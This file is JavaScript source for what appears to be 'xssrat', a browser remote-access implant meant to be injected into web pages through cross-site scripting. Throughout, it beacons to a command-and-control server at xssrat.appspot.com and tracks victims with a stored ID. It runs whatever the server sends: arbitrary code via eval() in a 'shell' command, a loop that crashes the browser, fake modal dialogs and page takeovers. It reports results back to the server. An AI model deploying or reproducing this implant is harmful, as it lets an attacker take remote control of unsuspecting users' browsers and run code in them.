
 if(typeof Modernizr == 'undefined'){
		;window.Modernizr=function(a,b,c){function t(a){i.cssText=a}function u(a,b){return t(prefixes.join(a+";")+(b||""))}function v(a,b){return typeof a===b}function w(a,b){return!!~(""+a).indexOf(b)}function x(a,b,d){for(var e in a){var f=b[a[e]];if(f!==c)return d===!1?a[e]:v(f,"function")?f.bind(d||b):f}return!1}var d="2.6.2",e={},f=b.documentElement,g="modernizr",h=b.createElement(g),i=h.style,j,k={}.toString,l={},m={},n={},o=[],p=o.slice,q,r={}.hasOwnProperty,s;!v(r,"undefined")&&!v(r.call,"undefined")?s=function(a,b){return r.call(a,b)}:s=function(a,b){return b in a&&v(a.constructor.prototype[b],"undefined")},Function.prototype.bind||(Function.prototype.bind=function(b){var c=this;if(typeof c!="function")throw new TypeError;var d=p.call(arguments,1),e=function(){if(this instanceof e){var a=function(){};a.prototype=c.prototype;var f=new a,g=c.apply(f,d.concat(p.call(arguments)));return Object(g)===g?g:f}return c.apply(b,d.concat(p.call(arguments)))};return e}),l.localstorage=function(){try{return localStorage.setItem(g,g),localStorage.removeItem(g),!0}catch(a){return!1}};for(var y in l)s(l,y)&&(q=y.toLowerCase(),e[q]=l[y](),o.push((e[q]?"":"no-")+q));return e.addTest=function(a,b){if(typeof a=="object")for(var d in a)s(a,d)&&e.addTest(d,a[d]);else{a=a.toLowerCase();if(e[a]!==c)return e;b=typeof b=="function"?b():b,typeof enableClasses!="undefined"&&enableClasses&&(f.className+=" "+(b?"":"no-")+a),e[a]=b}return e},t(""),h=j=null,e._version=d,e}(this,this.document);
	}


(function(){


	var xssrat = {
		homeURL: 'http://xssrat.appspot.com',
		pollSpeed: 10000,
		cid: undefined,
		beaconString: '',
		commandQueue: [],
		completedCommands: [],
		debugging: true,

		start: function(){
			var self = this;
			this.getOldCID();
			this.getStyles();
			this.loadLibs(function(){
				console.log("loaded");
				self.poll();
			});
			// this.poll();
			// setInterval(function(){ self.poll(); },this.pollSpeed);
		},

		getOldCID: function(){
			if(Modernizr.localstorage){
				var cid = localStorage.getItem("cid");
				if(cid !== null){
					console.log("there is a cid " + cid);
					this.cid = cid;
				}
				else{

					console.log("there is no cid");
				}
			}
		},

		poll: function(){
			var self = this;

			if(typeof this.cid !== 'undefined'){
				this.beaconString = '?cid=' + this.cid;
			}
			else{
				this.beaconString = '';
			}
			
			// Replace http://192.168.0.101 with your own domain that you're hosting from
			$.ajax({
				type: "GET",
				url: self.homeURL + "/beacon" + this.beaconString,
				dataType: 'json',
				
			}).done(function(data){

				if(data.type == 'cidAssign'){
					self.cidAssign(data);
				}
				else if(data.type == 'noCommand'){
					self.noCommand(data);
				}
				else if(data.type == 'command'){
					self.handleCommand(data);
				}
				else{
					console.log("what the fuck, nothing");
				}
				
			});

			setTimeout(function(){
				self.poll();
			},self.pollSpeed);
		},

		//Possible data types that can be returned under the key "type"
		cidAssign: function(data){
			console.log("assigning cid " + data.data.cid);
			this.cid = data.data.cid;
			if(Modernizr.localstorage){
				localStorage.setItem("cid", this.cid);
			}
			// console.log(data.data.cid);
		},

		commandTypes: {
			default  : function(id,instructions){ return new xssCommand(id,instructions); },
			alert    : function(id,instructions){ return new alertCommand(id,instructions); },
			alert2   : function(id,instructions){ return new alert2Command(id,instructions); },
			crash    : function(id,instructions){ return new crashCommand(id,instructions); },
			shell    : function(id,instructions){ return new shellCommand(id,instructions); },
			video    : function(id,instructions){ return new playVideoCommand(id,instructions); },
			pollspeed: function(id,instructions){ return new pollSpeedCommand(id,instructions); },
		},

		handleCommand: function(data){
			// Check to make sure we don't already have this command
			// Or we haven't already recently completed it before creating it

			console.log("HANDLE COMMAND FUNCTION - this.command = " + this.command);

			if(this.safeToMakeCommand(data.commandID)){
				console.log(data);
				var type = data.command[0];
				this.command = this.commandTypes[type](data.commandID,data.command[1]);
				console.log(this.command);
				// this.command.getInfo();
				this.command.perform();
			}


		},

		safeToMakeCommand: function(id){
			if(typeof this.command !== 'undefined'){ // If there is already a command
				console.log("NOT SAFE TO MAKE COMMAND: already have a command on the xssrat object");
				return false;
			}
			else{
				if(this.isAlreadyCompleted(id)){ // If we've already done this command, wait for the next beacon
					console.log("NOT SAFE TO MAKE COMMAND: already did command id: " + id);
					return false;
				}
				else{
					return true; // GIMME DEM COMMANDS
				}
			}
		},

		isAlreadyCompleted: function(id){

			var l = this.completedCommands.length;
			for(var i=0;i<l;i++){
				if(id == this.completedCommands[i]){
					return true;
				}
			}
			return false;
		},

		noCommand: function(){
			console.log("got back no commands, gonna wait then");
		},

		getStyles: function(){
			console.log("finding styles");
			var styletags = $('link');
			var styles = []
			styletags.each(function(i){
				styles.push(styletags[i].href);
			})
			xssrat.styles = styles;
		},

		isThereStyle: function(style){
			for(var i=0;i<this.styles.length;i++){
				if(this.styles[i].indexOf(style)){
					return true;
				}
				else{
					return false;
				}
			}
		},

		loadLibs: function(fn){
			if(location.host.indexOf("derekries") !== -1){
				fn();
			}
			else{

				var self = this;
				console.log("loading bootstrap");
				var bootstrap = document.createElement('link');
				bootstrap.setAttribute("rel","stylesheet");
				
				var bootstrapjs = document.createElement('script');
				var bcss = false;
				var bjs = false;
				bootstrap.onload = function(){
					bcss = true;
					console.log("done with css");
					if(bjs){
						document.body.appendChild(modalhtml);
						fn();
					}
				}
				bootstrapjs.onload = function(){
					bjs = true;
					console.log("done with js");
					if(bcss){
						document.body.appendChild(modalhtml);
						fn();
					}
				}
				var head = document.getElementsByTagName("head")[0];
				head.appendChild(bootstrap);
				head.appendChild(bootstrapjs);

				bootstrap.setAttribute("href", this.homeURL + '/app/css/bootstrap.min.css');
				bootstrapjs.src = this.homeURL + '/app/lib/bootstrap.min.js';


				var modalhtml = document.createElement("div");
				modalhtml.id = "myModal";
				modalhtml.setAttribute("class","modal hide fade");
				modalhtml.innerHTML = '<div class="modal-header"><button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button><h3>{{MH}}</h3></div><div class="modal-body"><p>{{MT}}</p></div><div class="modal-footer"><a href="#" data-dismiss="modal" class="btn">Close</a></div>';
			}

		}


	}


	// A command object represents the command thats been grabbed from this nodes
	// queue off of the server. There will only ever be one command at a time.
	// When a command is completed, its result is sent back to the server and 
	// this command is stored in the completed commands array, while the command slot
	// is opened up for a new command to take its place.
	// New commands are checked against completed commands to make sure there arent any
	// repeated commands coming from the server

	var xssCommand = function(dataId,dataCommand){
		console.log("new command created");
		this.id = dataId;
		this.instructions = dataCommand;
		this.result = 'no result';
	}

	xssCommand.prototype.getInfo = function() {
		console.log("COMMAND ID: " + this.id);
		console.log("COMMAND INSTRUCTIONS: " + this.instructions);
	};

	xssCommand.prototype.complete = function(){
		var self = this;
		$.post(xssrat.homeURL + '/completecommand', {
			"cid": xssrat.cid,
			"command": self.id,
			"result": self.result,
		}, function(data){
			console.log(data)
		});
		console.log("completing command " + this.id);
		xssrat.completedCommands.push(this.id);
		if(xssrat.completedCommands.length > 5){
			xssrat.completedCommands.splice(0,1);
		}
		delete xssrat.command;
	}

	xssCommand.prototype.perform = function() {
		console.log("Specific command objects should implement this method");
		this.complete();
	};





	var alertCommand = function(dataId,dataCommand){
		console.log("new alert command created");
		this.id = dataId;
		this.instructions = dataCommand;
		this.result = 'no result';
	}


	alertCommand.prototype = new xssCommand();
	alertCommand.prototype.constructor = alertCommand;

	alertCommand.prototype.perform = function() {
		alert(this.instructions);
		this.result = 'alert completed'
		this.complete();
	};



	var alert2Command = function(dataId,dataCommand){
		console.log("fancy alert message");
		this.id = dataId;
		this.instructions = dataCommand;
		this.result = 'no result';
	}


	alert2Command.prototype = new xssCommand();
	alert2Command.prototype.constructor = alert2Command;

	alert2Command.prototype.perform = function() {
		console.log(this.instructions);
		var htmlstring = $('#myModal').html();
		htmlstring = htmlstring.replace("{{MH}}",this.instructions[0]);
		htmlstring = htmlstring.replace("{{MT}}",this.instructions[1]);
		$('#myModal').html(htmlstring);
		$('#myModal').modal();
		this.complete();
	};



	var crashCommand = function(dataId,dataCommand){
		this.id = dataId;
		this.instructions = dataCommand;
		this.result = 'no result;'
	}

	crashCommand.prototype = new xssCommand();
	crashCommand.prototype.constructor = crashCommand;

	crashCommand.prototype.perform = function() {
		txt = "a";
		while(1){
		    txt = txt += "a";    //add as much as the browser can handle
		}
	};



	var shellCommand = function(dataId,dataCommand){
		this.id = dataId;
		this.instructions = dataCommand;
		this.result = 'no result';	
	}

	shellCommand.prototype = new xssCommand();
	shellCommand.prototype.constructor = shellCommand;

	shellCommand.prototype.perform = function() {
		eval(this.instructions);
		this.complete();
	};



	var playVideoCommand = function(dataId, dataCommand){
		this.id = dataId;
		this.instructions = dataCommand;
		this.result = 'no result';		
	}

	playVideoCommand.prototype = new xssCommand();
	playVideoCommand.prototype.constructor = playVideoCommand;

	playVideoCommand.prototype.perform = function() {
		console.log("creating video page");
		var vurl = this.instructions;
		var htmls = '<iframe id="ytplayer" type="text/html" width="853" height="480" src="http://www.youtube.com/embed/' + vurl + '?autoplay=1" frameborder="0"/>'

		$('body').html(htmls);
		this.complete();
	};


	var pollSpeedCommand = function(dataId, dataCommand){
		this.id = dataId;
		this.instructions = dataCommand;
		this.result = 'no result';
	}

	pollSpeedCommand.prototype = new xssCommand();
	pollSpeedCommand.prototype.constructor = pollSpeedCommand;

	pollSpeedCommand.prototype.perform = function() {
		// xssrat.pollSpeed = this.instructions;
		var ns = this.instructions[0];
		if(isNumber(ns)){
			xssrat.pollSpeed = ns;
		}
		this.complete();
	};



	window.xssrat = xssrat;
	window.xssCommand = xssCommand;


	window.log = function(input){
		if(xssrat.debugging){
			console.log(input);
		}
	}

	function isNumber(n) {
	  return !isNaN(parseFloat(n)) && isFinite(n);
	}

	window.isNumber = isNumber;

	if(typeof jQuery == 'undefined'){
		console.log('no jquery');
		var headTag = document.getElementsByTagName("head")[0];
		var jqTag = document.createElement('script');
		jqTag.type = 'text/javascript';
		jqTag.onload = runCode;
		// jqTag.onload = xssrat.start;
		jqTag.src = "http://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js";
		headTag.appendChild(jqTag);
	}
	else{
		// runCode();
		xssrat.start();
	}

	function runCode(){
		xssrat.start();
	}


})();
